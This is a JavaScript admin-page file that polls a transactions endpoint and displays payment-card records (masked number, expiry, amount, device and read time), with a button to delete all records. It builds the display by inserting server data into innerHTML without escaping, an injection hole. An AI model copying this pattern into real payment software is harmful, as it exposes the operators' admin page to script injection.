// admin.js
let updateInterval;

function startPolling() {
    // Initial load
    loadTransactions();
    
    // Clear any existing interval
    if (updateInterval) {
        clearInterval(updateInterval);
    }
    
    // Poll every 3 seconds
    updateInterval = setInterval(loadTransactions, 3000);
}

async function loadTransactions() {
    try {
        const response = await fetch('/transactions');
        const transactions = await response.json();
        
        const transactionList = document.getElementById('transactionList');
        if (!transactionList) return;
        
        transactionList.innerHTML = '';

        // Sort transactions by timestamp, most recent first
        transactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        transactions.forEach(transaction => {
            const row = document.createElement('div');
            row.className = 'transaction';
            row.innerHTML = `
                <div class="timestamp">
                    <strong>Transaction Time:</strong> ${new Date(transaction.timestamp).toLocaleString()}
                </div>
                <div class="card-info">
                    <p><strong>Transaction ID:</strong> ${transaction.id || 'N/A'}</p>
                    <p><strong>Card Type:</strong> ${transaction.type || 'Unknown'}</p>
                    <p><strong>Card Number:</strong> **** **** **** ${transaction.number.slice(-4)}</p>
                    <p><strong>Expiry:</strong> ${transaction.expiry || 'N/A'}</p>
                    <p><strong>Amount:</strong> €${transaction.amount?.toFixed(2) || '0.00'}</p>
                </div>
                <div class="device-info">
                    <p><strong>Device:</strong> ${transaction.deviceInfo || 'N/A'}</p>
                    <p><strong>Read Time:</strong> ${transaction.readTime || 'N/A'}</p>
                </div>
            `;
            transactionList.appendChild(row);
        });

        // Update transaction count
        const countElement = document.getElementById('transactionCount');
        if (countElement) {
            countElement.textContent = transactions.length;
        }

    } catch (error) {
        console.error('Error loading transactions:', error);
        const transactionList = document.getElementById('transactionList');
        if (transactionList) {
            transactionList.innerHTML = '<div class="error">Error loading transactions. Please refresh the page.</div>';
        }
    }
}

async function clearAllTransactions() {
    if (!confirm('Are you sure you want to delete all transactions?')) return;
    
    try {
        const response = await fetch('/transactions', {
            method: 'DELETE'
        });
        
        if (response.ok) {
            loadTransactions();
        } else {
            throw new Error('Failed to clear transactions');
        }
    } catch (error) {
        console.error('Error clearing transactions:', error);
        alert('Error clearing transactions. Please try again.');
    }
}

// Start polling when the page loads
document.addEventListener('DOMContentLoaded', startPolling);

// Clean up when leaving the page
window.addEventListener('beforeunload', () => {
    if (updateInterval) {
        clearInterval(updateInterval);
    }
});
